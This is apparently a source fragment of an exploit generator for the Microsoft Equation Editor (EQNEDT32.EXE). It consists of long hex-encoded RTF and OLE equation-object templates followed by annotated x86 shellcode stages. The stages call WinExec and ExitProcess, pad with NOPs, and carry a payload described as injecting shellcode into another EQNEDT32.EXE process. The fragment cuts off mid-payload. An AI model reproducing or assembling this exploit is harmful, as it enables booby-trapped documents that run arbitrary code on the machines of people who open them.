0A000000616161616161616161610C000000320A086D3A000A0000006161616161616161616108000000320AC86ABA340100000061000C000000320AC86A3A2D0A000000616161616161616161610C000000320AC86ABA250A000000616161616161616161610C000000320AC86A3A1E0A000000616161616161616161610C000000320AC86ABA160A000000616161616161616161610C000000320AC86A3A0F0A000000616161616161616161610C000000320AC86ABA070A000000616161616161616161610C000000320AC86A3A000A0000006161616161616161616108000000320A8868BA340100000061000C000000320A88683A2D0A000000616161616161616161610C000000320A8868BA250A000000616161616161616161610C000000320A88683A1E0A000000616161616161616161610C000000320A8868BA160A000000616161616161616161610C000000320A88683A0F0A000000616161616161616161610C000000320A8868BA070A000000616161616161616161610C000000320A88683A000A0000006161616161616161616108000000320A4866BA340100000061000C000000320A48663A2D0A000000616161616161616161610C000000320A4866BA250A000000616161616161616161610C000000320A48663A1E0A000000616161616161616161610C000000320A4866BA160A000000616161616161616161610C000000320A48663A0F0A000000616161616161616161610C000000320A4866BA070A000000616161616161616161610C000000320A48663A000A0000006161616161616161616108000000320A0864BA340100000061000C000000320A08643A2D0A000000616161616161616161610C000000320A0864BA250A000000616161616161616161610C000000320A08643A1E0A000000616161616161616161610C000000320A0864BA160A000000616161616161616161610C000000320A08643A0F0A000000616161616161616161610C000000320A0864BA070A000000616161616161616161610C000000320A08643A000A0000006161616161616161616108000000320AC861BA340100000061000C000000320AC8613A2D0A000000616161616161616161610C000000320AC861BA250A000000616161616161616161610C000000320AC8613A1E0A000000616161616161616161610C000000320AC861BA160A000000616161616161616161610C000000320AC8613A0F0A000000616161616161616161610C000000320AC861BA070A000000616161616161616161610C000000320AC8613A000A0000006161616161616161616108000000320A885FBA340100000061000C000000320A885F3A2D0A000000616161616161616161610C000000320A885FBA250A000000616161616161616161610C000000320A885F3A1E0A000000616161616161616161610C000000320A885FBA160A000000616161616161616161610C000000320A885F3A0F0A000000616161616161616161610C000000320A885FBA070A000000616161616161616161610C000000320A885F3A000A0000006161616161616161616108000000320A485DBA340100000061000C000000320A485D3A2D0A000000616161616161616161610C000000320A485DBA250A000000616161616161616161610C000000320A485D3A1E0A000000616161616161616161610C000000320A485DBA160A000000616161616161616161610C000000320A485D3A0F0A000000616161616161616161610C000000320A485DBA070A000000616161616161616161610C000000320A485D3A000A0000006161616161616161616108000000320A085BBA340100000061000C000000320A085B3A2D0A000000616161616161616161610C000000320A085BBA250A000000616161616161616161610C000000320A085B3A1E0A000000616161616161616161610C000000320A085BBA160A000000616161616161616161610C000000320A085B3A0F0A000000616161616161616161610C000000320A085BBA070A000000616161616161616161610C000000320A085B3A000A0000006161616161616161616108000000320AC858BA340100000061000C000000320AC8583A2D0A000000616161616161616161610C000000320AC858BA250A000000616161616161616161610C000000320AC8583A1E0A000000616161616161616161610C000000320AC858BA160A000000616161616161616161610C000000320AC8583A0F0A000000616161616161616161610C000000320AC858BA070A000000616161616161616161610C000000320AC8583A000A0000006161616161616161616108000000320A8856BA340100000061000C000000320A88563A2D0A000000616161616161616161610C000000320A8856BA250A000000616161616161616161610C000000320A88563A1E0A000000616161616161616161610C000000320A8856BA160A000000616161616161616161610C000000320A88563A0F0A000000616161616161616161610C000000320A8856BA070A000000616161616161616161610C000000320A88563A000A0000006161616161616161616108000000320A4854BA340100000061000C000000320A48543A2D0A000000616161616161616161610C000000320A4854BA250A000000616161616161616161610C000000320A48543A1E0A000000616161616161616161610C000000320A4854BA160A000000616161616161616161610C000000320A48543A0F0A000000616161616161616161610C000000320A4854BA070A000000616161616161616161610C000000320A48543A000A0000006161616161616161616108000000320A0852BA340100000061000C000000320A08523A2D0A000000616161616161616161610C000000320A0852BA250A000000616161616161616161610C000000320A08523A1E0A000000616161616161616161610C000000320A0852BA160A000000616161616161616161610C000000320A08523A0F0A000000616161616161616161610C000000320A0852BA070A000000616161616161616161610C000000320A08523A000A0000006161616161616161616108000000320AC84FBA340100000061000C000000320AC84F3A2D0A000000616161616161616161610C000000320AC84FBA250A000000616161616161616161610C000000320AC84F3A1E0A000000616161616161616161610C000000320AC84FBA160A000000616161616161616161610C000000320AC84F3A0F0A000000616161616161616161610C000000320AC84FBA070A000000616161616161616161610C000000320AC84F3A000A0000006161616161616161616108000000320A884DBA340100000061000C000000320A884D3A2D0A000000616161616161616161610C000000320A884DBA250A000000616161616161616161610C000000320A884D3A1E0A000000616161616161616161610C000000320A884DBA160A000000616161616161616161610C000000320A884D3A0F0A000000616161616161616161610C000000320A884DBA070A000000616161616161616161610C000000320A884D3A000A0000006161616161616161616108000000320A484BBA340100000061000C000000320A484B3A2D0A000000616161616161616161610C000000320A484BBA250A000000616161616161616161610C000000320A484B3A1E0A000000616161616161616161610C000000320A484BBA160A000000616161616161616161610C000000320A484B3A0F0A000000616161616161616161610C000000320A484BBA070A000000616161616161616161610C000000320A484B3A000A0000006161616161616161616108000000320A0849BA340100000061000C000000320A08493A2D0A000000616161616161616161610C000000320A0849BA250A000000616161616161616161610C000000320A08493A1E0A000000616161616161616161610C000000320A0849BA160A000000616161616161616161610C000000320A08493A0F0A000000616161616161616161610C000000320A0849BA070A000000616161616161616161610C000000320A08493A000A0000006161616161616161616108000000320AC846BA340100000061000C000000320AC8463A2D0A000000616161616161616161610C000000320AC846BA250A000000616161616161616161610C000000320AC8463A1E0A000000616161616161616161610C000000320AC846BA160A000000616161616161616161610C000000320AC8463A0F0A000000616161616161616161610C000000320AC846BA070A000000616161616161616161610C000000320AC8463A000A0000006161616161616161616108000000320A8844BA340100000061000C000000320A88443A2D0A000000616161616161616161610C000000320A8844BA250A000000616161616161616161610C000000320A88443A1E0A000000616161616161616161610C000000320A8844BA160A000000616161616161616161610C000000320A88443A0F0A000000616161616161616161610C000000320A8844BA070A000000616161616161616161610C000000320A88443A000A0000006161616161616161616108000000320A4842BA340100000061000C000000320A48423A2D0A000000616161616161616161610C000000320A4842BA250A000000616161616161616161610C000000320A48423A1E0A000000616161616161616161610C000000320A4842BA160A000000616161616161616161610C000000320A48423A0F0A000000616161616161616161610C000000320A4842BA070A000000616161616161616161610C000000320A48423A000A0000006161616161616161616108000000320A0840BA340100000061000C000000320A08403A2D0A000000616161616161616161610C000000320A0840BA250A000000616161616161616161610C000000320A08403A1E0A000000616161616161616161610C000000320A0840BA160A000000616161616161616161610C000000320A08403A0F0A000000616161616161616161610C000000320A0840BA070A000000616161616161616161610C000000320A08403A000A0000006161616161616161616108000000320AC83DBA340100000061000C000000320AC83D3A2D0A000000616161616161616161610C000000320AC83DBA250A000000616161616161616161610C000000320AC83D3A1E0A000000616161616161616161610C000000320AC83DBA160A000000616161616161616161610C000000320AC83D3A0F0A000000616161616161616161610C000000320AC83DBA070A000000616161616161616161610C000000320AC83D3A000A0000006161616161616161616108000000320A883BBA340100000061000C000000320A883B3A2D0A000000616161616161616161610C000000320A883BBA250A000000616161616161616161610C000000320A883B3A1E0A000000616161616161616161610C000000320A883BBA160A000000616161616161616161610C000000320A883B3A0F0A000000616161616161616161610C000000320A883BBA070A000000616161616161616161610C000000320A883B3A000A0000006161616161616161616108000000320A4839BA340100000061000C000000320A48393A2D0A000000616161616161616161610C000000320A4839BA250A000000616161616161616161610C000000320A48393A1E0A000000616161616161616161610C000000320A4839BA160A000000616161616161616161610C000000320A48393A0F0A000000616161616161616161610C000000320A4839BA070A000000616161616161616161610C000000320A48393A000A0000006161616161616161616108000000320A0837BA340100000061000C000000320A08373A2D0A000000616161616161616161610C000000320A0837BA250A000000616161616161616161610C000000320A08373A1E0A000000616161616161616161610C000000320A0837BA160A000000616161616161616161610C000000320A08373A0F0A000000616161616161616161610C000000320A0837BA070A000000616161616161616161610C000000320A08373A000A0000006161616161616161616108000000320AC834BA340100000061000C000000320AC8343A2D0A000000616161616161616161610C000000320AC834BA250A000000616161616161616161610C000000320AC8343A1E0A000000616161616161616161610C000000320AC834BA160A000000616161616161616161610C000000320AC8343A0F0A000000616161616161616161610C000000320AC834BA070A000000616161616161616161610C000000320AC8343A000A0000006161616161616161616108000000320A8832BA340100000061790C000000320A88323A2D0A000000616161616161616161610C000000320A8832BA250A000000616161616161616161610C000000320A88323A1E0A000000616161616161616161610C000000320A8832BA160A000000616161616161616161610C000000320A88323A0F0A000000616161616161616161610C000000320A8832BA070A000000616161616161616161610C000000320A88323A000A0000006161616161616161616108000000320A4830BA340100000061000C000000320A48303A2D0A000000616161616161616161610C000000320A4830BA250A000000616161616161616161610C000000320A48303A1E0A000000616161616161616161610C000000320A4830BA160A000000616161616161616161610C000000320A48303A0F0A000000616161616161616161610C000000320A4830BA070A000000616161616161616161610C000000320A48303A000A0000006161616161616161616108000000320A082EBA340100000061000C000000320A082E3A2D0A000000616161616161616161610C000000320A082EBA250A000000616161616161616161610C000000320A082E3A1E0A000000616161616161616161610C000000320A082EBA160A000000616161616161616161610C000000320A082E3A0F0A000000616161616161616161610C000000320A082EBA070A000000616161616161616161610C000000320A082E3A000A0000006161616161616161616108000000320AC82BBA340100000061000C000000320AC82B3A2D0A000000616161616161616161610C000000320AC82BBA250A000000616161616161616161610C000000320AC82B3A1E0A000000616161616161616161610C000000320AC82BBA160A000000616161616161616161610C000000320AC82B3A0F0A000000616161616161616161610C000000320AC82BBA070A000000616161616161616161610C000000320AC82B3A000A0000006161616161616161616108000000320A8829BA340100000061000C000000320A88293A2D0A000000616161616161616161610C000000320A8829BA250A000000616161616161616161610C000000320A88293A1E0A000000616161616161616161610C000000320A8829BA160A000000616161616161616161610C000000320A88293A0F0A000000616161616161616161610C000000320A8829BA070A000000616161616161616161610C000000320A88293A000A0000006161616161616161616108000000320A48273A690200000061610C000000320A4827BA610A000000616161616161616161610C000000320A48273A5A0A000000616161616161616161610C000000320A4827BA520A000000616161616161616161610C000000320A48273A4B0A000000616161616161616161610C000000320A4827BA430A000000616161616161616161610C000000320A48273A3C0A000000616161616161616161610C000000320A4827BA340A000000616161616161616161610C000000320A48273A2D0A000000616161616161616161610C000000320A4827BA250A000000616161616161616161610C000000320A48273A1E0A000000616161616161616161610C000000320A4827BA160A000000616161616161616161610C000000320A48273A0F0A000000616161616161616161610C000000320A4827BA070A000000616161616161616161610C000000320A48273A000A0000006161616161616161616108000000320A0825BA340100000061610C000000320A08253A2D0A000000616161616161616161610C000000320A0825BA250A000000616161616161616161610C000000320A08253A1E0A000000616161616161616161610C000000320A0825BA160A000000616161616161616161610C000000320A08253A0F0A000000616161616161616161610C000000320A0825BA070A000000616161616161616161610C000000320A08253A000A0000006161616161616161616108000000320AC822BA340100000061000C000000320AC8223A2D0A000000616161616161616161610C000000320AC822BA250A000000616161616161616161610C000000320AC8223A1E0A000000616161616161616161610C000000320AC822BA160A000000616161616161616161610C000000320AC8223A0F0A000000616161616161616161610C000000320AC822BA070A000000616161616161616161610C000000320AC8223A000A0000006161616161616161616108000000320A8820BA340100000061000C000000320A88203A2D0A000000616161616161616161610C000000320A8820BA250A000000616161616161616161610C000000320A88203A1E0A000000616161616161616161610C000000320A8820BA160A000000616161616161616161610C000000320A88203A0F0A000000616161616161616161610C000000320A8820BA070A000000616161616161616161610C000000320A88203A000A0000006161616161616161616108000000320A481EBA340100000061610C000000320A481E3A2D0A000000616161616161616161610C000000320A481EBA250A000000616161616161616161610C000000320A481E3A1E0A000000616161616161616161610C000000320A481EBA160A000000616161616161616161610C000000320A481E3A0F0A000000616161616161616161610C000000320A481EBA070A000000616161616161616161610C000000320A481E3A000A0000006161616161616161616108000000320A081CBA340100000061000C000000320A081C3A2D0A000000616161616161616161610C000000320A081CBA250A000000616161616161616161610C000000320A081C3A1E0A000000616161616161616161610C000000320A081CBA160A000000616161616161616161610C000000320A081C3A0F0A000000616161616161616161610C000000320A081CBA070A000000616161616161616161610C000000320A081C3A000A0000006161616161616161616108000000320AC819BA340100000061000C000000320AC8193A2D0A000000616161616161616161610C000000320AC819BA250A000000616161616161616161610C000000320AC8193A1E0A000000616161616161616161610C000000320AC819BA160A000000616161616161616161610C000000320AC8193A0F0A000000616161616161616161610C000000320AC819BA070A000000616161616161616161610C000000320AC8193A000A0000006161616161616161616108000000320A8817BA340100000061610C000000320A88173A2D0A000000616161616161616161610C000000320A8817BA250A000000616161616161616161610C000000320A88173A1E0A000000616161616161616161610C000000320A8817BA160A000000616161616161616161610C000000320A88173A0F0A000000616161616161616161610C000000320A8817BA070A000000616161616161616161610C000000320A88173A000A0000006161616161616161616108000000320A4815BA340100000061000C000000320A48153A2D0A000000616161616161616161610C000000320A4815BA250A000000616161616161616161610C000000320A48153A1E0A000000616161616161616161610C000000320A4815BA160A000000616161616161616161610C000000320A48153A0F0A000000616161616161616161610C000000320A4815BA070A000000616161616161616161610C000000320A48153A000A0000006161616161616161616108000000320A0813BA340100000061610C000000320A08133A2D0A000000616161616161616161610C000000320A0813BA250A000000616161616161616161610C000000320A08133A1E0A000000616161616161616161610C000000320A0813BA160A000000616161616161616161610C000000320A08133A0F0A000000616161616161616161610C000000320A0813BA070A000000616161616161616161610C000000320A08133A000A0000006161616161616161616108000000320AC810BA340100000061000C000000320AC8103A2D0A000000616161616161616161610C000000320AC810BA250A000000616161616161616161610C000000320AC8103A1E0A000000616161616161616161610C000000320AC810BA160A000000616161616161616161610C000000320AC8103A0F0A000000616161616161616161610C000000320AC810BA070A000000616161616161616161610C000000320AC8103A000A0000006161616161616161616108000000320A880EBA340100000061000C000000320A880E3A2D0A000000616161616161616161610C000000320A880EBA250A000000616161616161616161610C000000320A880E3A1E0A000000616161616161616161610C000000320A880EBA160A000000616161616161616161610C000000320A880E3A0F0A000000616161616161616161610C000000320A880EBA070A000000616161616161616161610C000000320A880E3A000A0000006161616161616161616108000000320A480CBA340100000061000C000000320A480C3A2D0A000000616161616161616161610C000000320A480CBA250A000000616161616161616161610C000000320A480C3A1E0A000000616161616161616161610C000000320A480CBA160A000000616161616161616161610C000000320A480C3A0F0A000000616161616161616161610C000000320A480CBA070A000000616161616161616161610C000000320A480C3A000A0000006161616161616161616108000000320A080ABA340100000061610C000000320A080A3A2D0A000000616161616161616161610C000000320A080ABA250A000000616161616161616161610C000000320A080A3A1E0A000000616161616161616161610C000000320A080ABA160A000000616161616161616161610C000000320A080A3A0F0A000000616161616161616161610C000000320A080ABA070A000000616161616161616161610C000000320A080A3A000A0000006161616161616161616108000000320AC807BA340100000061000C000000320AC8073A2D0A000000616161616161616161610C000000320AC807BA250A000000616161616161616161610C000000320AC8073A1E0A000000616161616161616161610C000000320AC807BA160A000000616161616161616161610C000000320AC8073A0F0A000000616161616161616161610C000000320AC807BA070A000000616161616161616161610C000000320AC8073A000A0000006161616161616161616108000000320A8805BA340100000061000C000000320A88053A2D0A000000616161616161616161610C000000320A8805BA250A000000616161616161616161610C000000320A88053A1E0A000000616161616161616161610C000000320A8805BA160A000000616161616161616161610C000000320A88053A0F0A000000616161616161616161610C000000320A8805BA070A000000616161616161616161610C000000320A88053A000A0000006161616161616161616108000000320A4803BA340100000061000C000000320A48033A2D0A000000616161616161616161610C000000320A4803BA250A000000616161616161616161610C000000320A48033A1E0A000000616161616161616161610C000000320A4803BA160A000000616161616161616161610C000000320A48033A0F0A000000616161616161616161610C000000320A4803BA070A000000616161616161616161610C000000320A48033A000A0000006161616161616161616108000000320A0801BA340100000061610C000000320A08013A2D0A000000616161616161616161610C000000320A0801BA250A000000616161616161616161610C000000320A08013A1E0A000000616161616161616161610C000000320A0801BA160A000000616161616161616161610C000000320A08013A0F0A000000616161616161616161610C000000320A0801BA070A000000616161616161616161610C000000320A08013A000A000000616161616161616161610A00000026060F000A00FFFFFFFF0100000000001C000000FB021000070000000000BC02000000860102022253797374656D000021008A0200000A00CD1166F121008A02FFFFFFFF78EF1900040000002D01010004000000F0010000030000000000&#125;&#123;\\result&#123;\\pict&#123;\\*\\picprop&#125;\\wmetafile8\\picw380\\pich260\\picwgoal380\\pichgoal2600100090000039e00000002001c00000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b0200000000050000000c02a00160021200000026060f001a00ffffffff000010000000c0ffffffc6ffffff20020000660100000b00000026060f000c004d61746854797065000020001c000000fb0280fe0000000000009001000000000402001054696d6573204e657720526f6d616e00feffffff5f2d0a6500000a0000000000040000002d01000009000000320a6001100003000000313131000a00000026060f000a00ffffffff0100000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a0100000a000600000048008a01ffffffff6ce21800040000002d01010004000000f0010000030000000000&#125;&#125;&#125;\\par&#125;&#x27;&#x27;&#x27;head605 = r&#x27;&#x27;&#x27;&#123;\\rtf1\\ansi\\ansicpg1252\\deff0\\nouicompat\\deflang1033&#123;\\fonttbl&#123;\\f0\\fnil\\fcharset0 Calibri;&#125;&#125;&#123;\\*\\generator Riched20 6.3.9600&#125;\\viewkind4\\uc1\\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang9&#123;\\object\\objemb\\objupdate&#123;\\*\\objclass Equation.3&#125;\\objw380\\objh260&#123;\\*\\objdata 01050000020000000B0000004571756174696F6E2E33000000000000000000000E0000D0CF11E0A1B11AE1000000000000000000000000000000003E000300FEFF0900060000000000000000000000010000000100000000000000001000000200000001000000FEFFFFFF0000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFFFFFF04000000FEFFFFFF05000000FEFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF52006F006F007400200045006E00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500FFFFFFFFFFFFFFFF0200000002CE020000000000C00000000000004600000000000000000000000070F7DECF0064D30103000000C00300000000000001004F006C00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000A000201FFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006F006D0070004F0062006A00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000FFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004F0062006A0049006E0066006F0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201FFFFFFFF04000000FFFFFFFF000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000FEFFFFFF02000000FEFFFFFFFEFFFFFF05000000060000000700000008000000090000000A0000000B0000000C0000000D0000000E000000FEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100FEFF030A0000FFFFFFFF02CE020000000000C000000000000046170000004D6963726F736F6674204571756174696F6E20332E30000C0000004453204571756174696F6E000B0000004571756174696F6E2E3300F439B271000000000000000000000000000000000000000000000000000000000000000000000000000000000300010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;&#x27;&#x27;stuff605 = &#x27;4500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000004000000B5020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;tail605 = r&#x27;&#x27;&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000105000000000000&#125;&#123;\\result&#123;\\pict&#123;\\*\\picprop&#125;\\wmetafile8\\picw380\\pich260\\picwgoal380\\pichgoal2600100090000039e00000002001c00000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b0200000000050000000c02a00160021200000026060f001a00ffffffff000010000000c0ffffffc6ffffff20020000660100000b00000026060f000c004d61746854797065000020001c000000fb0280fe0000000000009001000000000402001054696d6573204e657720526f6d616e00feffffff5f2d0a6500000a0000000000040000002d01000009000000320a6001100003000000313131000a00000026060f000a00ffffffff0100000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a0100000a000600000048008a01ffffffff6ce21800040000002d01010004000000f0010000030000000000&#125;&#125;&#125;\\par&#125;&#x27;&#x27;&#x27;# 0: b8 44 eb 71 12 mov eax,0x1271eb44# 5: ba 78 56 34 12 mov edx,0x12345678# a: 31 d0 xor eax,edx# c: 8b 08 mov ecx,DWORD PTR [eax]# e: 8b 09 mov ecx,DWORD PTR [ecx]# 10: 8b 09 mov ecx,DWORD PTR [ecx]# 12: 66 83 c1 3c add cx,0x3c# 16: 31 db xor ebx,ebx# 18: 53 push ebx# 19: 51 push ecx# 1a: be 64 3e 72 12 mov esi,0x12723e64# 1f: 31 d6 xor esi,edx# 21: ff 16 call DWORD PTR [esi] // call WinExec# 23: 53 push ebx# 24: 66 83 ee 4c sub si,0x4c# 28: ff 10 call DWORD PTR [eax] // call ExitProcessstagecmd = &quot;\\xB8\\x44\\xEB\\x71\\x12\\xBA\\x78\\x56\\x34\\x12\\x31\\xD0\\x8B\\x08\\x8B\\x09\\x8B\\x09\\x66\\x83\\xC1\\x3C\\x31\\xDB\\x53\\x51\\xBE\\x64\\x3E\\x72\\x12\\x31\\xD6\\xFF\\x16\\x53\\x66\\x83\\xEE\\x4C\\xFF\\x10&quot;# pads with nopstagecmd = stagecmd.ljust(44, &#x27;\\x90&#x27;)# 0: b8 44 eb 71 12 mov eax,0x1271eb44# 5: ba 78 56 34 12 mov edx,0x12345678# a: 31 d0 xor eax,edx# c: 8b 08 mov ecx,DWORD PTR [eax]# e: 8b 09 mov ecx,DWORD PTR [ecx]# 10: 8b 09 mov ecx,DWORD PTR [ecx]# 12: 66 83 c1 3c add cx,0x3c# 16: ff e1 jmp ecxstagesc = &quot;\\xB8\\x44\\xEB\\x71\\x12\\xBA\\x78\\x56\\x34\\x12\\x31\\xD0\\x8B\\x08\\x8B\\x09\\x8B\\x09\\x66\\x83\\xC1\\x3C\\xFF\\xE1&quot;# pads with nopstagesc = stagesc.ljust(44, &#x27;\\x90&#x27;)# This is shellcode to inject into another EQNEDT32.EXE and execute it# source at shellcode.cstageinject = &#x27;U\\x8b\\xec\\x83\\xe4\\xf8\\x81\\xec\\xc4\\x03\\x00\\x00\\xb9U\\x95\\xdbmSVW\\xe8\\xc8\\x02\\x00\\x00\\x8b\\xf8\\x85\\xffu\\x18\\xb9u\\xee@p\\xe8\\xb8\\x02\\x00\\x00\\x8b\\xf8\\x85\\xffu\\x083\\xc0@\\xe9\\xa3\\x02\\x00\\x00\\xba\\x9e3i\\xb7\\x8b\\xcf\\xe8\\xfb\\x02\\x00\\x00\\x8b\\xf0\\x85\\xf6t\\xe6\\xba*\\x92\\x12\\xd8\\xe8\\xeb\\x02\\x00\\x003\\xdb\\x89D$ \\x85\\xc0u\\x03S\\xff\\xd6\\xba\\xc8\\xe8&quot;o\\x8b\\xcf\\xe8\\xd2\\x02\\x00\\x00\\x89D$8\\x85\\xc0u\\x03S\\xff\\xd6\\xba\\xc2\\xcf\\xa2\\xeb\\x8b\\xcf\\xe8\\xbb\\x02\\x00\\x00\\x89D$D\\x85\\xc0u\\x03S\\xff\\xd6\\xba\\xaa?z\\xbe\\x8b\\xcf\\xe8\\xa4\\x02\\x00\\x00\\x89D$4\\x85\\xc0u\\x03S\\xff\\xd6\\xba\\xf3\\xf4\\xf8\\x97\\x8b\\xcf\\xe8\\x8d\\x02\\x00\\x00\\x89D$$\\x85\\xc0u\\x03S\\xff\\xd6\\xbaN\\x96 